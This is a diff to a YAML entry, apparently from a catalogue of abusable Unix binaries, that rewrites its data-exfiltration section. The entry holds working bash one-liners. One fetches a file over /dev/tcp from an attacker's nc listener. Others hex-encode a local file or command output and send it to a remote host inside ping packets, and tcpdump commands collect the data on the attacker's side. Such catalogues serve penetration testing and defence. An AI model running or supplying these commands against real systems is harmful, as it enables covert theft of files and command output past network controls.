@@ -16,14 +16,23 @@ functions:
     - description: Fetch remote file using a TCP connection. Run `nc -l -p 4444 < "file_to_send"` on the attacker box to send the file.
       code: |
         bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
-  data-exfiltration:
-    - description: | 
-        Exfiltration over ICMP packets embedded in ping requests (increment the timeout based on the file content)
-        Set a listener using tcpdump: `sudo timeout 10 tcpdump -i any -l -n -XX 'icmp' 2>/dev/null | grep '0x0060:'` (will require manual parsing cleaning)
-        Automate parsing cleaner: `sudo timeout 10 tcpdump -i any -l -n -XX 'icmp' 2>/dev/null | grep '0x0060:' | sed -n 's/^.*0x0060:.*[[:space:]]\{2,\}//p' | uniq | tr -d '\n' | sed 's/\./\.\n/g'`
-        (may miss dots and spaces)
-      code: |
-        hex=$(while IFS= read -r line; do for ((i=0; i<${#line}; i++));
-        do printf "%02x" "'${line:$i:1}"; done; done < $LFILE); i=0;
-        while [ $i -lt ${#hex} ]; do chunk="${hex:$i:16}"; ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
+data-exfiltration:
+  - description: |
+      Capture ICMP packets embedded in ping requests.
+      Run `sudo timeout 10 tcpdump -i any -l -n -XX 'icmp' 2>/dev/null | grep '0x0060:'` on the attacker box to collect the data.
+      ⚠️ Increase `timeout` based on the amount of data. Manual parsing or reconstruction is required.
+  - description: |
+      Send local file content over ICMP using hex-encoded payloads.
+    code: |
+      hex=$(while IFS= read -r line; do for ((i=0; i<${#line}; i++));
+	do printf "%02x" "'${line:$i:1}"; done; done < "$LFILE"); i=0;
+	while [ $i -lt ${#hex} ]; do chunk="${hex:$i:16}";
+	ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
+  - description: |
+      Send command output over ICMP using hex-encoded payloads.
+    code: |
+	hex=$(cmd="$($CMD)"; while IFS= read -r line; do for ((i=0; i<${#line}; i++));
+	do printf "%02x" "'${line:$i:1}"; done; done <<< "$cmd"); i=0;
+	while [ $i -lt ${#hex} ]; do chunk="${hex:$i:16}";
+	ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
 ---
